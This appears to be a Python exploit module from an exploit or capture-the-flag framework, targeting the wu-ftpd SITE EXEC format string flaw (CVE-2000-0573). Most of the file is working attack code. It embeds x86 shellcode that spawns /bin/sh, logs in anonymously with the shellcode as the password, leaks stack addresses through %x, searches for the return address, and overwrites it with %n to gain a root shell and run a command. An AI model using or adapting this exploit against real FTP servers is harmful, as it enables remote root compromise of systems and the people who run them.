import string, time
from interfaces.hasparameters import StringParam, KeyListParam
import interfaces.exploit as exploit
from interfaces.exploit import Exploit, ExploitError, ServiceDown
import managers.ftp as ftp
from managers.egg import EggManager

desc =	''' 
<br>
<hr><center><big><b>
WuFTP Format String
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		
WuFTP SITE EXEC format string vulnerability
<br><br>
Wu-ftpd is vulnerable to a very serious remote attack in the SITE EXEC implementation.
Because of user input going directly into a format string for a *printf function,
it is possible to overwrite important data, such as a return address, on the stack.
When this is accomplished, the function can jump into shellcode pointed to by the
overwritten eip and execute arbitrary commands as root. While exploited in a manner
similar to a buffer overflow, it is actually an input validation problem. Anonymous
ftp is exploitable making it even more serious as attacks can come anonymously from
anywhere on the internet.
<br><br>
<b>References</b><hr>
Published: June 22, 2000
CVE: CVE-2000-0573<br>
Bugtraq: 1387<br>
<br>
<b>Attack Details</b><hr>

<br><br><br>
'''

shellcode=  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"+\
            "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"+\
			"\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"+\
			"\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"+\
			"\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"+\
			"\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"+\
			"\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"+\
			"\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"+\
			"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"+\
			"\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"+\
			"\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31"

class FTPFormatString(Exploit):
	MAX_ITERATION = 50
	
	def __init__(self):
		Exploit.__init__(self,'Wuftpd format string', desc)
		self.add_param(StringParam('RESULT','well done','The string that must be present in the result if the attack is successful'))
		self.add_param(StringParam('CMD','cat /flag.txt', 'The command to be executed on the remote host'))
		
		self.eggm      = None
		self.res       = ''


	def set_up(self):
		self.eggm = EggManager(shellcode,390)
		pass

	def execute(self):
		#self.eggm = EggManager(shellcode,390)
		self.res = ""
		
		ftpm = ftp.FTPManager()
		
		if ftpm.connect()==False:
			raise ServiceDown()

		self.log.info("Sending login...")
		if (ftpm.send_cmd('user anonymous')==False):
			raise ExploitError('Connection error')
		self.log.debug('Banner: %s'%ftpm.welcome)
		resp = ftpm.get_ftp_response()
		self.log.debug('Received: %s'%resp)
		if ('331' in resp)==False:
			raise ExploitError('Unable to log-in')
		
		egg = self.eggm.get_egg()

		passwd = ftp.FTPCommand('pass',[egg])
		ftpm.send_cmd(passwd)
		resp = ftpm.get_ftp_response()
		self.log.debug('Received: %s'%resp)
		if ('230' in resp)==False:
			raise ExploitError('Unable to log-in')

		self.log.info("Logged in (the egg is inside)")

		ftpm.send_cmd("SITE EXEC exec %x %x %x %x +%x |%x")
		reply = ftpm.get_ftp_response()
		self.log.debug('Received: %s'%reply)
		
		temp1 = string.index(reply,"|")
		temp2 = string.index(reply,"+")
		reta = long(reply[temp1+1:string.index(reply,"\n")],16)
		retz = long(reply[temp2+1:temp1],16)

		params = []
		for i in range(89): params.append("%x")
		params.append("|%x")
		ftpm.send_cmd(ftp.FTPCommand("site exec",params))
		reply = ftpm.get_ftp_response()
		
		retb = long(reply[string.index(reply,"|")+1 : string.index(reply,"\n")],16)
		add = 0
		if reta == 0: 
			reta = retz
		else:
			add = 600
		reta = reta - 0x58
		retb = retb +100 -0x2569 - add;
		self.log.debug(" reta = %x\r\n retz = %x\r\n retb = %x"%(reta,retz,retb))

		self.log.info(" Finding return address....")
		
		counter = 22
		st = 0
		while(counter<22+self.MAX_ITERATION):
			params = ["kkkkkkkkkkkkkkkkkkkkkkkkkkbbbb%c%c\xff%c%c"%\
			(reta & 0xff,\
			(reta & 0xff00) >> 8,\
			(reta & 0xff0000) >> 16,\
			(reta & 0xff000000) >> 24)]

			for i in range(129): 
				params.append("%f")
			for i in range(counter+1): 
				params.append("%d")
			params.append("|%x|%x")

			ftpm.send_cmd("SITE EXEC "+string.join(params,""))
			reply = ftpm.get_ftp_response()
						
			temp1 = string.index(reply,"|")
			temp2 = string.index(reply,"|",temp1+1)
			val = long(reply[temp1+1 : temp2],16)
			self.log.debug("   address = %x (I'm looking for %x)"%(val,reta))
			if (val != 0):
				if (val == reta):
					st = 1
					break
			counter = counter+1
		
		if counter==22+self.MAX_ITERATION:
			self.log.warning("Attack failed. I cannot find the return address")
			return
			
		self.log.debug("Return address found after %d iterations"%(counter-22+1))

		params = ["kkkkkkkkkkkkkkkkkkkkkkkkkkbbbb%c%c\xff%c%c"%\
		 (reta & 0xff,\
		 (reta & 0xff00) >> 8,\
		 (reta & 0xff0000) >> 16,\
		 (reta & 0xff000000) >> 24)]
		 
		for i in range(129): 
			params.append("%.f")
		for i in range(counter): 
			params.append("%d")
		if(add == 600):
			params.append("|%%.%ud%%n"%(retb+9807))
		else:
			params.append("|%%.%ud%%n"%(retb+9807-480))

		ftpm.send_cmd("SITE EXEC "+string.join(params,""))
		
		self.log.info("Waiting for a shell....")
		time.sleep(2)
		
		self.log.info("Sending command")
		ftpm.send_raw(self.CMD+"\n")
		
		temp = ftpm.sock.readline('\n',blocking=True)
		self.log.debug('Received: %s'%temp)
		
		self.res = ftpm.sock.readline('\n',blocking=True)
		self.log.debug("Result %r"%self.res)
		
	def isSuccessful(self):
		if self.RESULT in self.res:
			return exploit.RES_OK
		else:
			return exploit.RES_FAIL


	


